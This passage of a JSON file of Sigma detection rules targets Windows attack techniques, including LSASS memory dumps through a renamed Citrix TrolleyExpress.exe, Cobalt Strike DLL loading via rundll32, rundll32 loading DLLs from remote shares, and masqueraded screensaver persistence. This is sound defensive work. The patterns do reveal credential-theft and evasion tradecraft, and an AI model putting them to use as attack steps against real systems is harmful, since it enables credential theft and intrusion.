                            "REGSVR32.EXE",
                            "RUNDLL32.EXE"
                        ]
                    }
                ]
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "6812a10b-60ea-420c-832f-dfcc33b646ba",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2024/03/07",
            "references": [
                "https://github.com/p3nt4/PowerShdll/blob/62cfa172fb4e1f7f4ac00ca942685baeb88ff356/README.md"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "Potential PowerShell Execution Via DLL"
        },
        {
            "author": "Florian Roth (Nextron Systems)",
            "date": "2022/02/10",
            "description": "Detects a possible process memory dump that uses the white-listed Citrix TrolleyExpress.exe filename as a way to dump the lsass process memory",
            "detection": {
                "condition": "selection or ( renamed and not 1 of filter* )",
                "filter_empty": {
                    "OriginalFileName": null
                },
                "filter_renamed": {
                    "OriginalFileName|contains": "CtxInstall"
                },
                "renamed": {
                    "Image|endswith": "\\TrolleyExpress.exe"
                },
                "selection": {
                    "CommandLine|contains": [
                        "\\TrolleyExpress 7",
                        "\\TrolleyExpress 8",
                        "\\TrolleyExpress 9",
                        "\\TrolleyExpress.exe 7",
                        "\\TrolleyExpress.exe 8",
                        "\\TrolleyExpress.exe 9",
                        "\\TrolleyExpress.exe -ma "
                    ]
                }
            },
            "falsepositives": [
                "Unknown"
            ],
            "fields": [
                "CommandLine",
                "ParentCommandLine"
            ],
            "id": "4c0aaedc-154c-4427-ada0-d80ef9c9deb6",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2022/05/13",
            "status": "test",
            "references": [
                "https://twitter.com/_xpn_/status/1491557187168178176",
                "https://www.youtube.com/watch?v=Ie831jF0bb0"
            ],
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011",
                "attack.credential_access",
                "attack.t1003.001"
            ],
            "title": "Process Access via TrolleyExpress Exclusion"
        },
        {
            "author": "Nasreddine Bencherchali (Nextron Systems)",
            "date": "2022/08/10",
            "description": "Detects rundll32 execution where the DLL is located on a remote location (share)",
            "detection": {
                "condition": "all of selection_*",
                "selection_cli": {
                    "CommandLine|contains": " \\\\\\\\"
                },
                "selection_img": [
                    {
                        "Image|endswith": "\\rundll32.exe"
                    },
                    {
                        "OriginalFileName": "RUNDLL32.EXE"
                    },
                    {
                        "CommandLine|contains": "rundll32"
                    }
                ]
            },
            "falsepositives": [
                "Unlikely"
            ],
            "id": "5cdb711b-5740-4fb2-ba88-f7945027afac",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "references": [
                "https://www.cybereason.com/blog/rundll32-the-infamous-proxy-for-executing-malicious-code"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.execution",
                "attack.t1021.002",
                "attack.t1218.011"
            ],
            "title": "Rundll32 UNC Path Execution"
        },
        {
            "author": "Wojciech Lesicki",
            "date": "2021/06/01",
            "description": "Rundll32 can be use by Cobalt Strike with StartW function to load DLLs from the command line.",
            "detection": {
                "condition": "all of selection*",
                "selection_params": {
                    "CommandLine|contains": ".dll",
                    "CommandLine|endswith": [
                        " StartW",
                        ",StartW"
                    ]
                },
                "selection_rundll": [
                    {
                        "Image|endswith": "\\rundll32.exe"
                    },
                    {
                        "OriginalFileName": "RUNDLL32.EXE"
                    },
                    {
                        "CommandLine|contains": [
                            "rundll32.exe",
                            "rundll32 "
                        ]
                    }
                ]
            },
            "falsepositives": [
                "Unknown"
            ],
            "id": "ae9c6a7c-9521-42a6-915e-5aaa8689d529",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2022/09/16",
            "references": [
                "https://www.cobaltstrike.com/help-windows-executable",
                "https://redcanary.com/threat-detection-report/",
                "https://thedfirreport.com/2020/10/18/ryuk-in-5-hours/"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "CobaltStrike Load by Rundll32"
        },
        {
            "author": "Oleg Kolesnikov @securonix invrep_de, oscd.community, Florian Roth (Nextron Systems), Christian Burkard (Nextron Systems)",
            "date": "2020/10/23",
            "description": "Detects attackers using tooling with bad opsec defaults.\nE.g. spawning a sacrificial process to inject a capability into the process without taking into account how the process is normally run.\nOne trivial example of this is using rundll32.exe without arguments as a sacrificial process (default in CS, now highlighted by c2lint), running WerFault without arguments (Kraken - credit am0nsec), and other examples.\n",
            "detection": {
                "condition": "1 of selection_* and not 1 of filter_main_* and not 1 of filter_optional_*",
                "filter_main_edge_update": {
                    "ParentImage|contains|all": [
                        ":\\Users\\",
                        "\\AppData\\Local\\Microsoft\\EdgeUpdate\\Install\\{"
                    ]
                },
                "filter_optional_chrome_installer": {
                    "Image|endswith": "\\rundll32.exe",
                    "CommandLine|endswith": "rundll32.exe",
                    "ParentCommandLine|contains": "--uninstall --channel=stable",
                    "ParentImage|contains|all": [
                        ":\\Users\\",
                        "\\AppData\\Local\\Google\\Chrome\\Application\\"
                    ],
                    "ParentImage|endswith": "\\Installer\\setup.exe"
                },
                "selection_regasm": {
                    "CommandLine|endswith": "regasm.exe",
                    "Image|endswith": "\\regasm.exe"
                },
                "selection_regsvcs": {
                    "CommandLine|endswith": "regsvcs.exe",
                    "Image|endswith": "\\regsvcs.exe"
                },
                "selection_regsvr32": {
                    "CommandLine|endswith": "regsvr32.exe",
                    "Image|endswith": "\\regsvr32.exe"
                },
                "selection_rundll32": {
                    "Image|endswith": "\\rundll32.exe",
                    "CommandLine|endswith": "rundll32.exe"
                },
                "selection_werfault": {
                    "CommandLine|endswith": "WerFault.exe",
                    "Image|endswith": "\\WerFault.exe"
                }
            },
            "falsepositives": [
                "Unlikely"
            ],
            "id": "a7c3d773-caef-227e-a7e7-c2f13c622329",
            "level": "high",
            "logsource": {
                "category": "process_creation",
                "product": "windows"
            },
            "modified": "2023/12/02",
            "references": [
                "https://blog.malwarebytes.com/malwarebytes-news/2020/10/kraken-attack-abuses-wer-service/",
                "https://www.cobaltstrike.com/help-opsec",
                "https://twitter.com/CyberRaiju/status/1251492025678983169",
                "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32",
                "https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/rundll32",
                "https://learn.microsoft.com/en-us/dotnet/framework/tools/regasm-exe-assembly-registration-tool",
                "https://learn.microsoft.com/en-us/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool"
            ],
            "related": [
                {
                    "id": "f5647edc-a7bf-4737-ab50-ef8c60dc3add",
                    "type": "obsoletes"
                }
            ],
            "status": "experimental",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "Bad Opsec Defaults Sacrificial Processes With Improper Arguments"
        },
        {
            "author": "Jose Luis Sanchez Martinez (@Joseliyo_Jstnk)",
            "date": "2022/05/04",
            "description": "Detects registry key established after masqueraded .scr file execution using Rundll32 through desk.cpl",
            "detection": {
                "condition": "selection and registry and not filter",
                "filter": {
                    "Details|contains": [
                        "C:\\Windows\\System32\\",
                        "C:\\Windows\\SysWOW64\\"
                    ]
                },
                "registry": {
                    "Details|endswith": ".scr",
                    "TargetObject|contains": "\\Control Panel\\Desktop\\SCRNSAVE.EXE"
                },
                "selection": {
                    "Image|endswith": "\\rundll32.exe"
                }
            },
            "falsepositives": [
                "Legitimate use of screen saver"
            ],
            "id": "40b6e656-4e11-4c0c-8772-c1cc6dae34ce",
            "level": "medium",
            "logsource": {
                "category": "registry_set",
                "product": "windows"
            },
            "modified": "2023/08/17",
            "references": [
                "https://twitter.com/VakninHai/status/1517027824984547329",
                "https://twitter.com/pabraeken/status/998627081360695297",
                "https://jstnk9.github.io/jstnk9/research/InstallScreenSaver-SCR-files"
            ],
            "status": "test",
            "tags": [
                "attack.defense_evasion",
                "attack.t1218.011"
            ],
            "title": "ScreenSaver Registry Key Set"
        }
    ]
}